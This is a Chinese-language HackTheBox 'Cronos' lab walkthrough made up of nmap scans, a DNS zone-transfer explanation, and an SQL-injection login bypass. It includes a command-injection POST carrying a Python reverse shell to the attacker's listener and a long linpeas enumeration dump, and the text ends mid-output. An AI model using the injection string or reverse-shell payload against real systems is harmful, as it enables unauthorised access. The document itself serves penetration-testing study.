hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 25.53% done; ETC: 09:55 (0:00:09 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 25.93% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 26.37% done; ETC: 09:55 (0:00:11 remaining)\rStats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\rSYN Stealth Scan Timing: About 26.61% done; ETC: 09:55 (0:00:11 remaining)\rNmap scan report for 10.129.227.211\rHost is up (0.12s latency).\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 2048 18b973826f26c7788f1b3988d802cee8 (RSA)\r| 256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)\r|_ 256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)\r53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux)\r| dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.18 (Ubuntu)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.93%E=4%D=5/5%OT=22%CT=1%CU=33883%PV=Y%DS=2%DC=T%G=Y%TM=64546241\rOS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%II=I%TS=8)SEQ(SP=10\rOS:2%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=8)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3\rOS:=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=7120%W2=7\rOS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW\rOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\rOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\rOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\rOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\rOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 2 hops\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE (using port 23/tcp)\rHOP RTT ADDRESS\r1 129.81 ms 10.10.16.1\r2 91.69 ms 10.129.227.211\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 47.67 seconds gobuster dir -u http://10.129.227.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k 访问80端口，是一个apache的welcome页面，没有什么太多的信息。尝试爆破目录，但是没有什么收获。其他的端口还有22端口和53端口，22端口测试了一下ssh用户枚举但是没有什么收获，53端口是域名服务器开放的DNS服务。\nnslookup requseted_domain_name name_server //向域名服务器发起查询域名的请求,查询域名对应的ip nslookup requseted_ip name_server //向域名服务器查询ip对应的域名 nslookup 10.129.227.211 10.129.227.211//in-addr.arpa是反查的ip，可以发现ip地址也是反着的，name是这个ip在服务器里对应的域名记录。 可以得到的信息是，这个10.129.227.211 ip地址对应的域名是ns1.cronos.htb，那么说明10.129.227.211这台机器是cronos.htb的域名解析服务器。那么问题来了，cronos.htb的ip地址是多少呢。\n┌──(root㉿kali)-[~/桌面/vpn]\r└─# nslookup cronos.htb 10.129.227.211\rServer: 10.129.227.211\rAddress: 10.129.227.211#53\rName: cronos.htb\rAddress: 10.10.10.13 dig命令的axfr可以查询域名服务器里关于一个域名的所有域名记录\ndig axfr @name_server domain_name ┌──(root㉿kali)-[~/桌面/vpn]\r└─# dig axfr @10.129.227.211 cronos.htb\r; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.12-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.129.227.211 cronos.htb\r; (1 server found)\r;; global options: +cmd\rcronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\rcronos.htb. 604800 IN NS ns1.cronos.htb.\rcronos.htb. 604800 IN A 10.10.10.13\radmin.cronos.htb. 604800 IN A 10.10.10.13\rns1.cronos.htb. 604800 IN A 10.10.10.13\rwww.cronos.htb. 604800 IN A 10.10.10.13\rcronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\r;; Query time: 112 msec\r;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)\r;; WHEN: Fri May 05 14:23:17 CST 2023\r;; XFR size: 7 records (messages 1, bytes 203) DNS域传送\r作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。\r若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。\r大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。\rDNS域传送漏洞检测\r常用的三种检测方法: nslookup命令, nmap命令，　dig命令，　下面将分别演示如何用三种方法检测dns域传送漏洞 可以看到，按道理来说10.10.10.13是cronos.htb和admin.cronos.htb的地址，但是在更改/etc/hosts文件时发现，添加\n10.10.10.13 cronos.htb\r10.10.10.13 admin.cronos.htb 并不能访问到admin.cronos.htb。说明域名服务器里的域名记录是过时的，cronos.htb的ip已经不是10.10.10.13，尝试更改为\n10.129.227.211 cronos.htb\r10.129.227.211 admin.cronos.htb 再次尝试访问，可以通过域名访问到。\n通过万能密码登录\nusername=admin\u0026#39; or 1=1 -- + ┌──(root㉿kali)-[~/桌面/vpn]\r└─# nc -nlvp 1234 listening on [any] 1234 ...\rconnect to [10.10.16.9] from (UNKNOWN) [10.129.227.211] 41124\rbash: cannot set terminal process group (1368): Inappropriate ioctl for device\rbash: no job control in this shell\rwww-data@cronos:/var/www/admin$ POST /welcome.php HTTP/1.1\rHost: admin.cronos.htb\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 27\rOrigin: http://admin.cronos.htb\rConnection: close\rReferer: http://admin.cronos.htb/welcome.php\rCookie: PHPSESSID=pr80aei8ulogg0342so9f4kk34\rUpgrade-Insecure-Requests: 1\rcommand=python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.16.9\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026amp;host= www-data@cronos:/var/www/html$ ./linpeas.sh\r./linpeas.sh\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄\r▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄\r▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄\r▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄\r▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄\r▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\rlinpeas v3.1.5 - Safe OSCP by carlospolop\rADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEGEND: RED/YELLOW: 95% a PE vector\rRED: You must take a look at it\rLightCyan: Users with console\rBlue: Users without console \u0026amp; mounted devs\rGreen: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMangeta: Your username\rStarting linpeas. Caching Writable Folders...\r════════════════════════════════════╣ Basic information ╠════════════════════════════════════ OS: Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017\rUser \u0026amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)\rHostname: cronos\rWritable folder: /dev/shm\r[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h) [+] /bin/nc is available for network discover \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE ════════════════════════════════════╣ System Information ╠════════════════════════════════════ [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017\rDistributor ID: Ubuntu\rDescription: Ubuntu 16.04.2 LTS\rRelease: 16.04\rCodename: xenial\r[+] Sudo version\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.16 [+] USBCreator\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation [+] PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r[+] Date\rFri May 5 11:08:06 EEST 2023 [+] System stats\rFilesystem Size Used Avail Use% Mounted on udev 477M 0 477M 0% /dev\rtmpfs 100M 7.0M 93M 7% /run\r/dev/mapper/cronos--vg-root 6.6G 2.6G 3.9G 41% /\rtmpfs 497M 0 497M 0% /dev/shm\rtmpfs 5.0M 0 5.0M 0% /run/lock\rtmpfs 497M 0 497M 0% /sys/fs/cgroup\r/dev/sda1 248M 153M 83M 65% /boot\rtotal used free shared buff/cache available\rMem: 1016096 285172 91572 18696 639352 501732\rSwap: 1048572 1176 1047396\r[+] CPU info\rArchitecture: x86_64 CPU op-mode(s): 32-bit, 64-bit\rByte Order: Little Endian\rCPU(s): 1\rOn-line CPU(s) list: 0\rThread(s) per core: 1\rCore(s) per socket: 1\rSocket(s): 1\rNUMA node(s): 1\rVendor ID: AuthenticAMD\rCPU family: 23\rModel: 49\rModel name: AMD EPYC 7302P 16-Core Processor\rStepping: 0\rCPU MHz: 2994.375\rBogoMIPS: 5988.75\rHypervisor vendor: VMware\rVirtualization type: full\rL1d cache: 32K\rL1i cache: 32K\rL2 cache: 512K\rL3 cache: 131072K\rNUMA node0 CPU(s): 0\rFlags: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap xsaveopt arat\r[+] Environment\r[i] Any private information inside environment variables? HISTFILESIZE=0 SHLVL=2\rAPACHE_RUN_DIR=/var/run/apache2\rAPACHE_PID_FILE=/var/run/apache2/apache2.pid\r_=./linpeas.sh\rPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\rAPACHE_LOCK_DIR=/var/lock/apache2\rLANG=C\rHISTSIZE=0\rAPACHE_RUN_USER=www-data\rAPACHE_RUN_GROUP=www-data\rAPACHE_LOG_DIR=/var/log/apache2\rHISTFILE=/dev/null\r[+] Searching Signature verification failed in dmseg\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed Not Found [+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.\rapparmor module is loaded.\r[+] grsecurity present? ............ grsecurity Not Found\r[+] PaX bins present? .............. PaX Not Found [+] Execshield enabled? ............ Execshield Not Found [+] SELinux enabled? ............... sestatus Not Found [+] Is ASLR enabled? ............... Yes [+] Printer? ....................... lpstat Not Found\r[+] Is this a virtual machine? ..... Yes (vmware) [+] Is this a container? ........... No\r[+] Any running containers? ........ No ═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════ [+] Any sd*/disk* disk in /dev? (limit 20) disk sda\rsda1\rsda2\rsda5\r[+] Unmounted file-system?\r[i] Check if you can mount umounted devices /dev/mapper/cronos--vg-root / ext4 errors=remount-ro 0 1 UUID=259f5707-a2a1-4efc-9c76-1f74e1fc2f6e /boot ext2 defaults 0 2\r/dev/mapper/cronos--vg-swap_1 none swap sw 0 0\r/dev/fd0 /media/floppy0 auto rw,user,noauto,exec,utf8 0 0\r════════════════════════════════════╣ Available Software ╠════════════════════════════════════ [+] Useful software /bin/nc /bin/netcat\r/usr/bin/wget\r/usr/bin/curl\r/bin/ping\r/usr/bin/base64\r/usr/bin/python\r/usr/bin/python2\r/usr/bin/python3\r/usr/bin/python2.7\r/usr/bin/perl\r/usr/bin/php\r/usr/bin/sudo\r/usr/bin/lxc\r[+] Installed Compiler\r/usr/share/gcc-5 ══════════════════════════════╣ Processes, Cron, Services, Timers \u0026amp; Sockets ╠════════════════════════════════ [+] Cleaned processes [i] Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes root 1 0.0 0.5 37840 5824 ? Ss 04:50 0:02 /sbin/init root 481 0.0 0.3 29504 3120 ? Ss 04:50 0:00 /lib/systemd/systemd-journald\rroot 508 0.0 0.1 102968 1528 ? Ss 04:50 0:00 /sbin/lvmetad -f\rroot 520 0.0 0.3 44508 3700 ? Ss 04:50 0:00 /lib/systemd/systemd-udevd\rsystemd+ 812 0.0 0.2 100324 2384 ? Ssl 04:50 0:00 /lib/systemd/systemd-timesyncd\r└─(Caps) 0x0000000002000000=cap_sys_time\rroot 924 0.0 2.2 266532 22436 ? Ssl 04:50 0:00 /usr/lib/snapd/snapd\rroot 928 0.0 0.1 4400 1320 ? Ss 04:50 0:00 /usr/sbin/acpid\rdaemon[0m 930 0.0 0.1 26044 1956 ? Ss 04:50 0:00 /usr/sbin/atd -f\rroot 940 0.0 0.2 29008 2732 ? Ss 04:50 0:00 /usr/sbin/cron -f\rroot 942 0.0 1.1 275860 12068 ? Ssl 04:50 0:00 /usr/lib/accountsservice/accounts-daemon[0m\rsyslog 943 0.0 0.3 256396 3056 ? Ssl 04:50 0:00 /usr/sbin/rsyslogd -n\rroot 952 0.0 0.1 20100 1164 ? Ss 04:50 0:00 /lib/systemd/systemd-logind\rroot 953 0.0 0.5 629524 5976 ? Ssl 04:50 0:00 /usr/bin/lxcfs /var/lib/lxcfs/\rroot 954 0.0 1.0 192236 10476 ? Ssl 04:50 0:16 /usr/bin/vmtoolsd\rmessage+ 964 0.0 0.3 42904 3720 ? Ss 04:50 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation └─(Caps) 0x0000000020000000=cap_audit_write\rroot 1005 0.0 0.0 13376 168 ? Ss 04:50 0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog\rroot 1016 0.0 0.5 277180 5784 ? Ssl 04:50 0:00 /usr/lib/policykit-1/polkitd --no-debug\rroot 1093 0.0 0.2 16124 2828 ? Ss 04:50 0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160\rroot 1197 0.0 0.5 65520 6084 ? Ss 04:50 0:00 /usr/sbin/sshd -D\rroot 1230 0.0 0.0 5224 160 ? Ss 04:50 0:00 /sbin/iscsid\rroot 1231 0.0 0.3 5724 3512 ? S\u0026lt;Ls 04:50 0:02 /sbin/iscsid\rmysql 1251 0.0 16.6 1107396 169272 ? Ssl 04:50 0:07 /usr/sbin/mysqld\rbind 1333 0.0 1.8 208896 19176 ? Ssl 04:50 0:01 /usr/sbin/named -f -u bind -4\r└─(Caps) 0x0000000001000400=cap_net_bind_service,cap_sys_resource\rroot 1348 0.0 0.1 15940 1644 tty1 Ss+ 04:50 0:00 /sbin/agetty --noclear tty1 linux\rroot 1368 0.0 2.9 325536 29744 ? Ss 04:50 0:01 /usr/sbin/apache2 -k start\rwww-data 2728 0.0 1.4 326404 14768 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 2730 0.0 2.1 326612 21380 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 2731 0.0 1.4 326404 14776 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 15813 0.0 0.3 18216 3296 ? S 10:22 0:00 | _ /bin/bash -i\rwww-data 15859 0.0 0.6 32172 6972 ? S 10:26 0:00 | _ python -c import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\rwww-data 15860 0.0 0.3 18228 3332 pts/0 Ss 10:26 0:00 | _ /bin/bash\rwww-data 16348 0.4 0.2 4844 2056 pts/0 S+ 11:08 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 17002 0.0 0.0 4844 496 pts/0 S+ 11:08 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 17006 0.0 0.3 34724 3236 pts/0 R+ 11:08 0:00 | | _ ps fauxwww\rwww-data 17005 0.0 0.0 4844 496 pts/0 S+ 11:08 0:00 | _ /bin/sh ./linpeas.sh\rwww-data 5033 0.0 1.4 326404 14768 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 8826 0.0 1.4 326404 14768 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 12577 0.0 1.4 326404 14832 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 13185 0.0 1.5 326404 15760 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 13187 0.0 1.4 326404 14844 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 13199 0.0 1.4 326404 14844 ? S 06:25 0:03 _ /usr/sbin/apache2 -k start www-data 13589 0.0 1.5 326412 15900 ? S 07:00 0:01 _ /usr/sbin/apache2 -k start [+] Binary processes permissions\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes -rwxr-xr-x 1 root root 1037528 Jun 24 2016 /bin/bash lrwxrwxrwx 1 root root 4 Mar 22 2017 /bin/sh -\u0026gt; dash\r-rwxr-xr-x 1 root root 326224 Jan 19 2017 /lib/systemd/systemd-journald\r-rwxr-xr-x 1 root root 618520 Jan 19 2017 /lib/systemd/systemd-logind\r-rwxr-xr-x 1 root root 141904 Jan 19 2017 /lib/systemd/systemd-timesyncd\r-rwxr-xr-x 1 root root 453240 Jan 19 2017 /lib/systemd/systemd-udevd\r-rwxr-xr-x 1 root root 44104 Dec 16 2016 /sbin/agetty\r-rwxr-xr-x 1 root root 487248 Dec 9 2016 /sbin/dhclient\rlrwxrwxrwx 1 root root 20 Mar 22 2017 /sbin/init -\u0026gt; /lib/systemd/systemd\r-rwxr-xr-x 1 root root 783984 Dec 9 2016 /sbin/iscsid\r-rwxr-xr-x 1 root root 51336 Apr 16 2016 /sbin/lvmetad\r-rwxr-xr-x 1 root root 513216 Feb 20 2017 /sbin/mdadm\r-rwxr-xr-x 1 root root 224208 Jan 12 2017 /usr/bin/dbus-daemon[0m\r-rwxr-xr-x 1 root root 18504 Feb 3 2017 /usr/bin/lxcfs\r-rwxr-xr-x 1 root root 44528 Feb 9 2017 /usr/bin/vmtoolsd\r-rwxr-xr-x 1 root root 164928 Nov 3 2016 /usr/lib/accountsservice/accounts-daemon[0m -rwxr-xr-x 1 root root 15048 Jan 18 2016 /usr/lib/policykit-1/polkitd\r-rwxr-xr-x 1 root root 18977392 Feb 24 2017 /usr/lib/snapd/snapd\r-rwxr-xr-x 1 root root 48112 Apr 9 2016 /usr/sbin/acpid\r-rwxr-xr-x 1 root root 646080 Jul 15 2016 /usr/sbin/apache2\r-rwxr-xr-x 1 root root 26632 Jan 15 2016 /usr/sbin/atd\r-rwxr-xr-x 1 root root 44472 Apr 6 2016 /usr/sbin/cron\r-rwxr-xr-x 1 root root 24741672 Feb 6 2017 /usr/sbin/mysqld\r-rwxr-xr-x 1 root root 639672 Feb 15 2017 /usr/sbin/named\r-rwxr-xr-x 1 root root 599328 Apr 5 2016 /usr/sbin/rsyslogd\r-rwxr-xr-x 1 root root 799216 Aug 11 2016 /usr/sbin/sshd\r[+] Files opened by processes belonging to other users\r[i] This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME\r[+] Processes with credentials in memory (root req)\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd Not Found apache2 process found (dump creds from memory as root) sshd Not Found\r[+] Cron jobs\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found\r-rw-r--r-- 1 root root 797 Apr 9 2017 /etc/crontab /etc/cron.d:\rtotal 24\rdrwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder\r-rw-r--r-- 1 root root 589 Jul 16 2014 mdadm\r-rw-r--r-- 1 root root 670 Mar 1 2016 php\r-rw-r--r-- 1 root root 191 Mar 22 2017 popularity-contest\r/etc/cron.daily:\rtotal 60\rdrwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder\r-rwxr-xr-x 1 root root 539 Apr 6 2016 apache2\r-rwxr-xr-x 1 root root 376 Mar 31 2016 apport\r-rwxr-xr-x 1 root root 1474 Jan 17 2017 apt-compat\r-rwxr-xr-x 1 root root 355 May 22 2012 bsdmainutils\r-rwxr-xr-x 1 root root 1597 Nov 27 2015 dpkg\r-rwxr-xr-x 1 root root 372 May 6 2015 logrotate\r-rwxr-xr-x 1 root root 1293 Nov 6 2015 man-db\r-rwxr-xr-x 1 root root 539 Jul 16 2014 mdadm\r-rwxr-xr-x 1 root root 435 Nov 18 2014 mlocate\r-rwxr-xr-x 1 root root 249 Nov 13 2015 passwd\r-rwxr-xr-x 1 root root 3449 Feb 26 2016 popularity-contest\r-rwxr-xr-x 1 root root 214 May 24 2016 update-notifier-common\r/etc/cron.hourly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder\r/etc/cron.monthly:\rtotal 12\rdrwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder\r/etc/cron.weekly:\rtotal 24\rdrwxr-xr-x 2 root root 4096 May 10 2022 .\rdrwxr-xr-x 95 root root 4096 Jun 17 2022 ..\r-rw-r--r-- 1 root root 102 Apr 6 2016 .placeholder\r-rwxr-xr-x 1 root root 86 Apr 13 2016 fstrim\r-rwxr-xr-x 1 root root 771 Nov 6 2015 man-db\r-rwxr-xr-x 1 root root 211 May 24 2016 update-notifier-common\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r* * * * * root php /var/www/laravel/artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1\r[+] Services\r[i] Search for outdated versions [ + ] acpid [ + ] apache-htcacheclean\r[ + ] apache2\r[ + ] apparmor\r[ + ] apport\r[ + ] atd\r[ + ] bind9\r[ - ] bootmisc.sh\r[ - ] checkfs.sh\r[ - ] checkroot-bootclean.sh\r[ - ] checkroot.sh\r[ + ] console-setup\r[ + ] cron\r[ - ] cryptdisks\r[ - ] cryptdisks-early\r[ + ] dbus\r[ + ] grub-common\r[ - ] hostname.sh\r[ - ] hwclock.sh\r[ + ] irqbalance\r[ + ] iscsid\r[ + ] keyboard-setup\r[ - ] killprocs\r[ + ] kmod\r[ - ] lvm2\r[ + ] lvm2-lvmetad\r[ + ] lvm2-lvmpolld\r[ + ] lxcfs\r[ - ] lxd\r[ + ] mdadm\r[ - ] mdadm-waitidle\r[ - ] mountall-bootclean.sh\r[ - ] mountall.sh\r[ - ] mountdevsubfs.sh\r[ - ] mountkernfs.sh\r[ - ] mountnfs-bootclean.sh\r[ - ] mountnfs.sh\r[ + ] mysql\r[ + ] networking\r[ + ] ondemand\r[ + ] open-iscsi\r[ + ] open-vm-tools\r[ - ] plymouth\r[ - ] plymouth-log\r[ + ] procps\r[ + ] rc.local\r[ + ] resolvconf\r[ - ] rsync\r[ + ] rsyslog\r[ - ] screen-cleanup\r[ - ] sendsigs\r[ + ] ssh\r[ + ] udev\r[ - ] umountfs\r[ - ] umountnfs.sh\r[ - ] umountroot\r[ + ] urandom\r[ - ] uuidd\r[+] Systemd PATH\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin [+] Analyzing .service files\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services /lib/systemd/system/emergency.service is executing some relative path /lib/systemd/system/networking.service is executing some relative path\r/lib/systemd/system/rescue.service is executing some relative path\rYou can\u0026#39;t write on systemd PATH\r[+] System timers\r[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES\rFri 2023-05-05 12:05:39 EEST 56min left Fri 2023-05-05 07:44:14 EEST 3h 